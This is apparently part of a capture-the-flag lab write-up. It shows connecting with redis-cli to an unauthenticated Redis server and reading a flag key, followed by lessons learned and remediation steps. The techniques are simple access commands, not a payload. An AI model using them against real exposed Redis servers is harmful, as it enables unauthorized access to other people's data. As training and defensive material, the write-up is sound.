## Exploitation
 
**Observation:** Port 6379 (Redis) is open with no authentication configured.
 
**Action:** Connected to Redis directly using redis-cli.
 
```bash
# Install redis tools if needed
sudo apt install redis-tools -y
 
# Connect to Redis — no password needed
redis-cli -h <machine-ip>
```
 
**Commands run inside Redis:**
 
```bash
# Check Redis info
info
 
# List all keys in the database
keys *
 
# Read the flag key
get flag
```
 
**Result:** Flag retrieved directly from Redis database.

## What I Learned
 
1. Redis with no authentication is a critical misconfiguration — entire database accessible to anyone
2. Redis often runs on port 6379 — always include in full port scans
3. Exposed Redis instances are frequently used by attackers to store web shells or exfiltrate data

---
 
## Remediation
 
- Always set a strong password on Redis (requirepass in redis.conf)
- Bind Redis to localhost (127.0.0.1) unless remote access is explicitly needed
- Block port 6379 at the firewall — Redis should never be internet-facing
- Enable Redis ACL system for granular access control
